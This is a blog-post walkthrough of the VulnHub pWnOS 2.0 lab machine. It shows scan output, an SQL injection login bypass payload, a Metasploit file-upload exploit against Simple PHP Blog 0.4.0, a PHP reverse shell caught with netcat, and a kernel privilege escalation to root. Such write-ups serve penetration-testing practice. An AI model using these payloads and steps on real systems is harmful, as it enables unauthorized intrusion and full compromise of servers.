---
layout: post
title:  "pWnOS: 2.0"
date:   2021-1-23  +0400
categories: vulnhub pwnos
description: "pWnOS v2.0 is a Virutal Machine Image which hosts a server to pratice penetration testing. It will test your ability to exploit the server and contains multiple entry points to reach the goal (root). Fun machine, I reccomend it for all CTF players."
---

<span style="text-decoration: underline">Box Stats:</span>

| Name: | pWnOS: 2.0 |
|-------|--------|
| Series: | [pWnOS](https://www.vulnhub.com/series/pwnos,3/) |
| Link: | [pWnOS: 2.0](https://www.vulnhub.com/entry/pwnos-20-pre-release,34/) |
| OS: | Linux - Ubuntu 11.04 |
| Creator: | [pWnOS](https://www.vulnhub.com/author/pwnos,6/) |

## Topics: ##
- Enumeration
- Exploit Research
- Directory Bruteforcing
- Privilige Escalation

# Recon #
Start your `nmap` scans, which will give the output of:
```
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)
|   2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)
|_  256 10:12:64:4b:7d:ff:6a:87:37:26:38:b1:44:9f:cf:5e (ECDSA)
80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.17 (Ubuntu)
|_http-title: Welcome to this Site!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The ouput seems to give us only two ports open, which are port `80 (http), and 22 (ssh)`. This suggests that we will have to find a vulnerablity in the webapp that is installed on the website. Let's get into hacking this machine!
# Enumeration #
```
22 - SSH - OpenSSH
80 - HTTP - Apache 2.2.17
```

I enumerated the version of apache further to find that the operating system was `Ubuntu 11.04`. Like many CTF challenges before, SSH is never a protocol that we will "exploit", rather we will use it to get a stable connection to the machine once we gathered credentials. Let's deep diver into the website running on port 80!

## Port 80 - HTTP ##
Start your scans! I use `dirsearch` and `nikto` against the machine:

nikto:
```
+ Server: Apache/2.2.17 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ Retrieved x-powered-by header: PHP/5.3.5-1ubuntu7
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3268: /includes/: Directory indexing found.
+ OSVDB-3092: /includes/: This might be interesting...
+ /info/: Output from the phpinfo() function was found.
+ OSVDB-3092: /info/: This might be interesting...
+ OSVDB-3092: /login/: This might be interesting...
+ OSVDB-3092: /register/: This might be interesting...
+ /info.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3268: /icons/: Directory indexing found.
+ Server may leak inodes via ETags, header found with file /icons/README, inode: 1311031, size: 5108, mtime: Tue Aug 28 10:48:10 2007
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ /login.php: Admin login page/section found.
```

dirsearch:
```
[13:34:01] 403 -  294B  - /.ht_wsr.txt
[13:34:01] 403 -  297B  - /.htaccess.bak1
[13:34:01] 403 -  297B  - /.htaccess.orig
[13:34:01] 403 -  299B  - /.htaccess.sample
[13:34:01] 403 -  295B  - /.htaccessBAK
[13:34:01] 403 -  295B  - /.htaccessOLD
[13:34:01] 403 -  297B  - /.htaccess.save
[13:34:01] 403 -  298B  - /.htaccess_extra
[13:34:01] 403 -  296B  - /.htaccessOLD2
[13:34:01] 403 -  297B  - /.htaccess_orig
[13:34:01] 403 -  295B  - /.htaccess_sc
[13:34:01] 403 -  287B  - /.htm
[13:34:01] 403 -  288B  - /.html
[13:34:01] 403 -  294B  - /.httr-oauth
[13:34:01] 403 -  293B  - /.htpasswds
[13:34:01] 403 -  297B  - /.htpasswd_test
[13:34:11] 302 -    0B  - /activate  ->  http://10.10.10.100/index.php
[13:34:20] 301 -  317B  - /blog  ->  http://192.168.221.224/blog/
[13:34:21] 403 -  291B  - /cgi-bin/
[13:34:21] 200 -    8KB - /blog/
[13:34:23] 403 -  287B  - /doc/
[13:34:23] 403 -  291B  - /doc/api/
[13:34:23] 403 -  302B  - /doc/en/changes.html
[13:34:23] 403 -  301B  - /doc/stable.version
[13:34:26] 301 -  321B  - /includes  ->  http://192.168.221.224/includes/
[13:34:26] 200 -    1KB - /includes/
[13:34:26] 200 -  854B  - /index
[13:34:26] 200 -  854B  - /index.php
[13:34:26] 200 -  854B  - /index.php/login/
[13:34:26] 200 -   51KB - /info
[13:34:26] 200 -   51KB - /info.php
[13:34:27] 200 -    1KB - /login
[13:34:27] 200 -    1KB - /login.php
[13:34:27] 200 -    1KB - /login/
[13:34:27] 200 -    1KB - /login/administrator/
[13:34:27] 200 -    1KB - /login/cpanel.php
[13:34:27] 200 -    1KB - /login/admin/
[13:34:27] 200 -    1KB - /login/cpanel.jsp
[13:34:27] 200 -    1KB - /login/admin/admin.asp
[13:34:27] 200 -    1KB - /login/cpanel.aspx
[13:34:27] 200 -    1KB - /login/cpanel.htm
[13:34:27] 200 -    1KB - /login/cpanel.asp
[13:34:27] 200 -    1KB - /login/cpanel.html
[13:34:27] 200 -    1KB - /login/cpanel.js
[13:34:27] 200 -    1KB - /login/cpanel/
[13:34:27] 200 -    1KB - /login/index
[13:34:27] 200 -    1KB - /login/login
[13:34:27] 200 -    1KB - /login/oauth/
[13:34:27] 200 -    1KB - /login/super
[13:34:33] 200 -    2KB - /register.php
[13:34:33] 200 -    2KB - /register
[13:34:35] 403 -  296B  - /server-status
[13:34:35] 403 -  297B  - /server-status/
```

After I conducted my scans, I proceeded to the website itself. The first thing that caught my attention was the register link. I quickly registered using `test@test.com : test`. From here, I tried logging in with those credentials. Once logged in, you are greeted with a static "Logging you in..." page:

![Static Login page](https://github.com/ctrllevi/ctrllevi.github.io/blob/main/_posts/images/pwnos2/login.png?raw=true)

As this was a dead end, I continued enumerating the `Login` link. I usually enter `'` into the input fields to check for SQL errors, and fortunately, this gave me this error:
```
An error occurred in script '/var/www/login.php' on line 47: Query: SELECT * FROM users WHERE email=''' AND pass='bb589d0621e5472f470fa3425a234c74b1e202e8' AND active IS NULL
MySQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'bb589d0621e5472f470fa3425a234c74b1e202e8' AND active IS NULL' at line 1
Date/Time: 1-23-2021 04:38:33 
```

This helped me a lot, as I was able to craft my own SQL injection. Since we know the query is `SELECT * FROM users WHERE email=''' AND pass='bb589d0621e5472f470fa3425a234c74b1e202e8' AND active IS NULL`, we can use the input `' or 1=1 -- .` in both fields to get logged in as `admin@isints.com`. However, once logged in, we still have that static page. It seems like this is just a dead end as well, even though we are logged in as admin.


Another thing that was interesting, which was disclosed by the dirsearch scan was the `/blog/` directory. I also did a dirsearch on this directory which gave me the output of:

```
[13:59:06] 403 -  299B  - /blog/.ht_wsr.txt
[13:59:06] 403 -  302B  - /blog/.htaccess.orig
[13:59:06] 403 -  302B  - /blog/.htaccess.save
[13:59:06] 403 -  304B  - /blog/.htaccess.sample
[13:59:06] 403 -  302B  - /blog/.htaccess.bak1
[13:59:06] 403 -  300B  - /blog/.htaccessOLD
[13:59:06] 403 -  301B  - /blog/.htaccessOLD2
[13:59:06] 403 -  300B  - /blog/.htaccess_sc
[13:59:06] 403 -  292B  - /blog/.htm
[13:59:06] 403 -  293B  - /blog/.html
[13:59:06] 403 -  303B  - /blog/.htaccess_extra
[13:59:06] 403 -  302B  - /blog/.htaccess_orig
[13:59:06] 403 -  300B  - /blog/.htaccessBAK
[13:59:06] 403 -  298B  - /blog/.htpasswds
[13:59:06] 403 -  302B  - /blog/.htpasswd_test
[13:59:06] 403 -  299B  - /blog/.httr-oauth
[13:59:15] 302 -    0B  - /blog/add  ->  http://192.168.221.224/blog/index.php
[13:59:15] 302 -    0B  - /blog/add.php  ->  http://192.168.221.224/blog/index.php
[13:59:15] 302 -    0B  - /blog/add_link.php  ->  http://192.168.221.224/blog/index.php
[13:59:23] 200 -    1KB - /blog/atom
[13:59:25] 302 -    0B  - /blog/categories  ->  http://192.168.221.224/blog/index.php
[13:59:25] 302 -    0B  - /blog/comments  ->  http://192.168.221.224/blog/index.php
[13:59:25] 301 -  324B  - /blog/config  ->  http://192.168.221.224/blog/config/
[13:59:25] 200 -    1KB - /blog/config/
[13:59:26] 301 -  325B  - /blog/content  ->  http://192.168.221.224/blog/content/
[13:59:26] 200 -  916B  - /blog/content/
[13:59:26] 200 -    6KB - /blog/contact
[13:59:26] 200 -    6KB - /blog/contact.php
[13:59:27] 302 -    0B  - /blog/delete.php  ->  http://192.168.221.224/blog/index.php
[13:59:27] 301 -  322B  - /blog/docs  ->  http://192.168.221.224/blog/docs/
[13:59:27] 200 -    2KB - /blog/docs/
[13:59:29] 301 -  323B  - /blog/flash  ->  http://192.168.221.224/blog/flash/
[13:59:29] 200 -    1KB - /blog/flash/
[13:59:31] 301 -  324B  - /blog/images  ->  http://192.168.221.224/blog/images/
[13:59:31] 200 -  727B  - /blog/images/
[13:59:31] 200 -    8KB - /blog/index.php
[13:59:31] 200 -    8KB - /blog/index
[13:59:31] 200 -    8KB - /blog/index.php/login/
[13:59:31] 302 -    0B  - /blog/info.php  ->  http://192.168.221.224/blog/index.php
[13:59:31] 302 -    0B  - /blog/info  ->  http://192.168.221.224/blog/index.php
[13:59:32] 301 -  327B  - /blog/languages  ->  http://192.168.221.224/blog/languages/
[13:59:32] 302 -    0B  - /blog/languages.php  ->  http://192.168.221.224/blog/index.php
[13:59:32] 200 -    6KB - /blog/login/login
[13:59:32] 200 -    6KB - /blog/login/cpanel.aspx
[13:59:32] 200 -    6KB - /blog/login/
[13:59:32] 200 -    6KB - /blog/login.php
[13:59:32] 200 -    6KB - /blog/login
[13:59:32] 200 -    6KB - /blog/login/admin/
[13:59:33] 200 -    6KB - /blog/login/administrator/
[13:59:33] 200 -    6KB - /blog/login/cpanel.js
[13:59:33] 200 -    6KB - /blog/login/cpanel/
[13:59:33] 200 -    6KB - /blog/login/index
[13:59:33] 200 -    6KB - /blog/login/admin/admin.asp
[13:59:33] 200 -    6KB - /blog/login/cpanel.asp
[13:59:33] 200 -    6KB - /blog/login/cpanel.jsp
[13:59:33] 200 -    6KB - /blog/login/oauth/
[13:59:33] 200 -    6KB - /blog/login/cpanel.php
[13:59:33] 200 -    6KB - /blog/login/cpanel.html
[13:59:33] 200 -    6KB - /blog/login/cpanel.htm
[13:59:33] 200 -    6KB - /blog/login/super
[13:59:33] 302 -    0B  - /blog/logout  ->  http://192.168.221.224/blog/index.php
[13:59:33] 302 -    0B  - /blog/logout.php  ->  http://192.168.221.224/blog/index.php
[13:59:33] 302 -    0B  - /blog/logout/  ->  http://192.168.221.224/blog/index.php
[13:59:39] 301 -  325B  - /blog/scripts  ->  http://192.168.221.224/blog/scripts/
[13:59:39] 200 -    6KB - /blog/scripts/
[13:59:39] 200 -    1KB - /blog/rss.php
[13:59:39] 200 -    1KB - /blog/rss
[13:59:39] 302 -    0B  - /blog/setup  ->  http://192.168.221.224/blog/index.php
[13:59:39] 302 -    0B  - /blog/setup.php  ->  http://192.168.221.224/blog/index.php
[13:59:39] 302 -    0B  - /blog/setup/  ->  http://192.168.221.224/blog/index.php
[13:59:40] 302 -    0B  - /blog/static.php  ->  http://192.168.221.224/blog/index.php
[13:59:40] 302 -    0B  - /blog/static  ->  http://192.168.221.224/blog/index.php
[13:59:40] 302 -    0B  - /blog/static/dump.sql  ->  http://192.168.221.224/blog/static.php/index.php
[13:59:40] 200 -    5KB - /blog/search
[13:59:40] 200 -    5KB - /blog/search.php
[13:59:41] 301 -  324B  - /blog/themes  ->  http://192.168.221.224/blog/themes/
[13:59:41] 200 -    1KB - /blog/themes/
[13:59:41] 200 -    5KB - /blog/stats
[13:59:41] 200 -    5KB - /blog/stats/
[13:59:41] 302 -    0B  - /blog/trackback  ->  http://192.168.221.224/blog/index.php
[13:59:41] 302 -    0B  - /blog/upgrade  ->  http://192.168.221.224/blog/index.php
[13:59:41] 302 -    0B  - /blog/upgrade.php  ->  http://192.168.221.224/blog/index.php
```

Once browsing to the website, I was able to find the version by hovering the mouse over the dependecies that it used. It gave me the version of `0.4.0`. Using searchsploit it gave me a vulnerability:

```
Simple PHP Blog 0.4.0 - Remote Command Execution (Metasploit)
```

# Exploitation #
We can start metasploit, using the command `msfconsole`. From here we can use the `unix/webapp/sphpblog_file_upload` exploit and fill in the missing options (which is `RHOSTS`). When we run the exploit, here is what it displays:
```
msf5 exploit(unix/webapp/sphpblog_file_upload) > run

[*] Started reverse TCP handler on 192.168.221.42:4444 
[+] Successfully retrieved hash: $1$9ps6WNtA$kJ7oy1byhlIk6QBhlfSS6/
[+] Successfully removed /config/password.txt
[+] Successfully created temporary account.
[+] Successfully logged in as YekxdE:9oWqbA
[-] Error retrieving cookie!
[+] Successfully Uploaded ej9LGSWhFlLpOIFwBjA9.php
[+] Successfully Uploaded CPJGAzEtG48Qmkhh8XYf.php
[+] Successfully reset original password hash.
[+] Successfully removed /images/ej9LGSWhFlLpOIFwBjA9.php
[*] Calling payload: /images/CPJGAzEtG48Qmkhh8XYf.php
[+] Successfully removed /images/CPJGAzEtG48Qmkhh8XYf.php
[*] Exploit completed, but no session was created.
```
This means that it created an account called `YekxdE` with the password `9oWqbA`. We can login to this account on the blog website. Once logged in, head to the `Upload Image` section. We can not only upload images, but reverse shells as well! I copied the php reverse shell located at `/usr/share/webshells/php/php-reverse-shell.php`. We can edit the file with our IP address and the port we chose. Once this file is uploaded, it can be found at the `/blog/images` folder which we discovered when we did a dirsearch on the `blog` directory. Set up a listener, and click the file!

```
kali@maxtor:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.221.42] from (UNKNOWN) [192.168.221.224] 40721
Linux web 2.6.38-8-server #42-Ubuntu SMP Mon Apr 11 03:49:04 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
 06:02:11 up  1:58,  0 users,  load average: 0.00, 0.01, 0.01
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ 
```

Once we have shell access, I like to download the `linux-exploit-suggester.sh` tool on the victim's machine. Once it is downloaded and hasthe sufficient priviliges to run, it will give you exploits that may work on the target for privesc. The exploit that worked for me was [CVE:2013-2094](https://www.exploit-db.com/exploits/25444). After compiling the file with `gcc -O2 exploit.c`, I got root access!

```
www-data@web:/tmp$ gcc -O2 exploit.c                  
www-data@web:/tmp$ ls
a.out  exploit.c	linux-exploit-suggester.sh
www-data@web:/tmp$ ./a.out
2.6.37-3.x x86_64
sd@fucksheep.org 2010
root@web:/tmp# whoami; id                                                                                          
root
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

Thank you for reading this writeup, and I hope you learned as much as I did. I felt that this was easier than the pervious challange and required a bit less effort, but I would still rate it a solid 10/10 for the awesome design of the challange. Thanks again for visiting this writeup, and I hope to see you again!
